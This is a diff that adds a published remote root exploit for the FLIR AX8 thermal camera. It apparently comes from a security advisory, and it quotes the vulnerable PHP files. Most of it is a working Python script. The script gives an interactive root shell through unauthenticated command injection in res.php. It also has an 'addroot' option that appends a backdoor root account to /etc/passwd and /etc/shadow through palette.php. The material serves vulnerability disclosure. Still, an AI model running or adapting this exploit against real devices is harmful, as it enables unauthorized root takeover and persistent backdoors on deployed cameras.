@@ -1,0 +1,179 @@
+# Exploit Title: FLIR AX8 Thermal Camera 1.32.16 - Remote Code Execution
+# Author: Gjoko 'LiquidWorm' Krstic @zeroscience
+# Date: 2018-10-14
+# Vendor: FLIR Systems, Inc.
+# Product web page: https://www.flir.com
+# Affected version: Firmware: 1.32.16, 1.17.13, OS: neco_v1.8-0-g7ffe5b3, Hardware: Flir Systems Neco Board
+# Tested on: GNU/Linux 3.0.35-flir+gfd883a0 (armv7l), lighttpd/1.4.33, PHP/5.4.14
+# References:
+# Advisory ID: ZSL-2018-5491
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5491.php
+
+# Desc: The FLIR AX8 thermal sensor camera suffers from two unauthenticated
+# command injection vulnerabilities. The issues can be triggered when calling
+# multiple unsanitized HTTP GET/POST parameters within the shell_exec function
+# in res.php and palette.php file. This can be exploited to inject arbitrary
+# system commands and gain root remote code execution.
+
+# /FLIR/usr/www/res.php:
+# ----------------------
+# 1. <?php
+# 2.   if (isset($_POST["action"])) {
+# 3.     switch ($_POST["action"]) {
+# 4.       case "get":
+# 5.         if(isset($_POST["resource"]))
+# 6.         {
+# 7.           switch ($_POST["resource"]) {
+# 8.             case ".rtp.hflip":
+# 9.               if (!file_exists("/FLIR/system/journal.d/horizontal_flip.cfg")) {
+# 10.                $result = "false";
+# 11.                break;
+# 12.              }
+# 13.              $result = file_get_contents("/FLIR/system/journal.d/horizontal_flip.cfg") === "1" ? "true" : "false";
+# 14.              break;
+# 15.            case ".rtp.vflip":
+# 16.              if (!file_exists("/FLIR/system/journal.d/vertical_flip.cfg")) {
+# 17.                $result = "false";
+# 18.                break;
+# 19.              }
+# 20.              $result = file_get_contents("/FLIR/system/journal.d/vertical_flip.cfg") === "1" ? "true" : "false";
+# 21.              break;
+# 22.            default:
+# 23.              $result = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o ".$_POST["resource"]));
+# 24.          }
+# 25.        }
+
+# /FLIR/usr/www/palette.php:
+# --------------------------
+# 1. <?php
+# 2.   if(isset($_POST["palette"])){
+# 3.     shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/palette ".$_POST["palette"]);
+# 4.     echo json_encode(array("success"));
+# 5.   }
+# 6. ?>
+
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import colorama
+import random##
+import time####
+import json####
+import sys#####
+import os######
+
+piton = os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 2:
+    print '\n\x20\x20[*] Usage: '+piton+' <ip:port>\n'
+    sys.exit()
+
+bannah = """
+.---------------------------------.
+|         1984 Pictures           |
+|                                 |
+|            presents             |
+|                  ___            |
+|                [|   |=|{)__     |
+|                 |___| \/   )    |
+|                  /|\      /|    |
+|                 / | \     | \\   |
+.---------------------------------.
+"""
+print bannah
+time.sleep(4)
+os.system('clear')
+
+print '\nFLIR AX8 Thermal Camera Remote Root Exploit'
+print 'By Zero Science Lab'
+
+ICU = '''
+                ````````                
+           `./+ooosoooooo+/.`           
+        `.+ss+//:::::::://+ss+.`        
+       -oyo/::::-------:::::/oyo-       
+     `/yo+:::-------.------:::+oy/`     
+    `+yo+::---...........----:/+oy+`    
+   `/yo++/--...../+oo+:....---:/+oy/`   
+   `ss++//:-.../yhhhhhhy/...-://++ss`   
+   .ho++/::--.-yhhddddhhy-.--:://+oh.   
+   .ho+//::---/mmmmmmmmmm:---::/++oh.   
+   `ss++//::---+mNNNNNNm+---:://++ss`   
+   `/yo+//:::----+syys+-----://++oy/`   
+    `+yo++//:::-----------:://++oy+`    
+     `/yo++///:::::-:::::://+++oy/`     
+       .oyo+++////////////+++oyo.       
+        `.+ssoo++++++++++ooss+.`        
+           `./+osssssssso+/.`           
+                ````````                
+'''
+
+colors = list(vars(colorama.Fore).values())
+colored_chars = [random.choice(colors) + char for char in ICU]
+
+print(''.join(colored_chars))
+
+print
+print '\x1b[1;37;44m'+'To freeze the stream run:   '+'\x1b[0m'+' /FLIR/usr/bin/freeze on'
+print '\x1b[1;37;41m'+'To unfreeze the stream run: '+'\x1b[0m'+' /FLIR/usr/bin/freeze off\n'
+
+print '[*] Additional commands:'
+print ' [+] \'addroot\' for add root user.'
+print ' [+] \'exit\' for exit.\n'
+
+while True:
+
+    zeTargets = 'http://'+sys.argv[1]+'/res.php'
+    zeCommand = raw_input('\x1b[0;96;49m'+'root@neco-0J0X17:~# '+'\x1b[0m')
+    zeHeaders = {'Cache-Control'   : 'max-age=0',
+                 'User-Agent'      : 'thricer/251.4ev4h',
+                 'Accept'          : 'text/html,application/xhtml+xml',
+                 'Accept-Encoding' : 'gzip, deflate',
+                 'Accept-Language' : 'mk-MK,mk;q=1.7',
+                 'Connection'      : 'close',
+                 'Connection-Type' : 'application/x-www-form-urlencoded'}
+    zePardata = {'action'          : 'get',
+                 'resource'        : ';'+zeCommand}
+
+    try:
+
+        zeRequest = requests.post(zeTargets, headers=zeHeaders, data=zePardata)
+        print json.loads(zeRequest.text)
+
+        if zeCommand.strip() == 'exit':
+            sys.exit()
+
+        if zeCommand.strip() == 'addroot':
+            print '[+] Blind command injection using palette.php...'
+            print '[+] Adding user \'roOt\' with password \'rewt\' in shadow file...'
+
+            nuTargets = 'http://'+sys.argv[1]+'/palette.php'
+            nuHeaders = zeHeaders
+
+            nuHexstrn = ('\\x72\\x6f\\x4f\\x74\\x3a\\x24\\x31'
+                         '\\x24\\x4d\\x4a\\x4f\\x6e\\x56\\x2f'
+                         '\\x59\\x33\\x24\\x74\\x44\\x6e\\x4d'
+                         '\\x49\\x42\\x4d\\x79\\x30\\x6c\\x45'
+                         '\\x51\\x32\\x6b\\x44\\x70\\x66\\x67'
+                         '\\x54\\x4a\\x50\\x30\\x3a\\x31\\x36'
+                         '\\x39\\x31\\x34\\x3a\\x30\\x3a\\x39'
+                         '\\x39\\x39\\x39\\x39\\x3a\\x37\\x3a'
+                         '\\x3a\\x3a\\x0a\\x0d')
+
+            nuPadata1 = {'palette' : '1;echo \"roOt:x:0:0:pwn:/sys:/bin/bash\" >> /etc/passwd'}
+            nuPadata2 = {'palette' : '1;echo -n -e \"'+nuHexstrn+'\" >> /etc/shadow'}
+
+            requests.post(nuTargets, headers=nuHeaders, data=nuPadata1)
+            time.sleep(2)
+            requests.post(nuTargets, headers=nuHeaders, data=nuPadata2)
+            
+            print '[*] Success!\n'
+        else: pass
+
+    except Exception:
+        print '[*] Error!'
+        break
+
+sys.exit()
